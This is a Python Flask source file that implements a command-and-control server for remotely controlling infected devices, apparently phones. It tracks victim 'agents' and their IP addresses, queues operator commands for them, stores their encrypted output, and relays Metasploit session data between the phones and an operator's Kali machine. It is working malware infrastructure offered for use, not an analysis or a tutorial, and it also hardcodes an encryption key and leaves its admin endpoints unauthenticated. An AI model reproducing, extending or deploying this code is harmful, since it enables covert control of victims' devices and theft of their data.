from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import time
import ast
import sqlite3
import os
import collections

app = Flask(__name__)

# --- CONFIGURATION ---
SECRET_KEY = b'oWRo-pIVUqcUchAk9eKzNTGOTQcdr8l-xaoUVK3Vw_s='
cipher = Fernet(SECRET_KEY)
DB_PATH = "shadow.db"

# MSF Bridge Memory Buffers (In-memory for speed)
# Stores data keyed by Agent ID
msf_uplink_data = collections.defaultdict(list)   # Agent -> Server
msf_downlink_data = collections.defaultdict(list) # Server -> Agent

# --- DATABASE LOGIC ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS agents 
                 (id TEXT PRIMARY KEY, last_seen TEXT, info TEXT, remote_ip TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tasks 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, command TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS results 
                 (agent_id TEXT PRIMARY KEY, output TEXT)''')
    conn.commit()
    conn.close()

init_db()

def decrypt_data(data):
    try: return cipher.decrypt(data.encode()).decode()
    except: return data # Fallback if not encrypted

def encrypt_data(data):
    return cipher.encrypt(data.encode()).decode()

# --- AGENT COMMAND & CONTROL ---

@app.route('/api/v1/status', methods=['POST'])
def status():
    try:
        ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
        
        # We try to decrypt, but allow raw params for the bridge logic
        raw_payload = request.get_data().decode()
        
        # Parse params (id=...&pc=...)
        params = dict(x.split('=') for x in raw_payload.split('&'))
        agent_id = params.get('pc', 'Unknown')
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("REPLACE INTO agents (id, last_seen, info, remote_ip) VALUES (?, ?, ?, ?)",
                  (agent_id, time.strftime("%H:%M:%S"), "Active", ip))
        
        c.execute("SELECT id, command FROM tasks WHERE agent_id = ? ORDER BY id ASC LIMIT 1", (agent_id,))
        task = c.fetchone()
        
        if task:
            task_id, command = task
            c.execute("DELETE FROM tasks WHERE id = ?", (task_id,))
            conn.commit()
            conn.close()
            return encrypt_data(command)
        
        conn.commit()
        conn.close()
        return encrypt_data("IDLE")
    except:
        return encrypt_data("IDLE")

@app.route('/api/v1/results', methods=['POST'])
def results():
    agent_id = request.form.get('id')
    output = decrypt_data(request.form.get('data'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("REPLACE INTO results (agent_id, output) VALUES (?, ?)", (agent_id, f"[{time.strftime('%H:%M:%S')}] {output}"))
    conn.commit()
    conn.close()
    return "OK"

# --- METASPLOIT BRIDGE ENDPOINTS ---

@app.route('/api/v1/msf_uplink', methods=['POST'])
def msf_uplink():
    """Receives binary data from Phone, stores for the MSF Handler."""
    agent_id = request.form.get('id')
    data_b64 = request.form.get('data')
    if agent_id and data_b64:
        msf_uplink_data[agent_id].append(data_b64)
        return "OK"
    return "FAIL"

@app.route('/api/v1/msf_downlink', methods=['POST'])
def msf_downlink():
    """Sends binary data (commands) from MSF Handler to the Phone."""
    agent_id = request.form.get('id')
    if agent_id in msf_downlink_data and msf_downlink_data[agent_id]:
        # Return the oldest chunk of data (FIFO)
        return msf_downlink_data[agent_id].pop(0)
    return "NONE"

# --- ADMIN / CONTROLLER ENDPOINTS ---

@app.route('/admin/msf_get/<agent_id>', methods=['GET'])
def admin_msf_get(agent_id):
    """Your local Python script on Kali calls this to get data from the phone."""
    if agent_id in msf_uplink_data and msf_uplink_data[agent_id]:
        return msf_uplink_data[agent_id].pop(0)
    return ""

@app.route('/admin/msf_put/<agent_id>', methods=['POST'])
def admin_msf_put(agent_id):
    """Your local Python script on Kali calls this to send commands to the phone."""
    data_b64 = request.get_data().decode()
    msf_downlink_data[agent_id].append(data_b64)
    return "QUEUED"

@app.route('/admin/list', methods=['GET'])
def list_agents():
    conn = sqlite3.connect(DB_PATH); conn.row_factory = sqlite3.Row
    c = conn.cursor(); c.execute("SELECT * FROM agents")
    rows = [dict(row) for row in c.fetchall()]; conn.close()
    return jsonify(rows)

@app.route('/admin/task', methods=['POST'])
def add_task():
    data = request.json
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("INSERT INTO tasks (agent_id, command) VALUES (?, ?)", (data.get('id'), data.get('cmd')))
    conn.commit(); conn.close()
    return "QUEUED"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
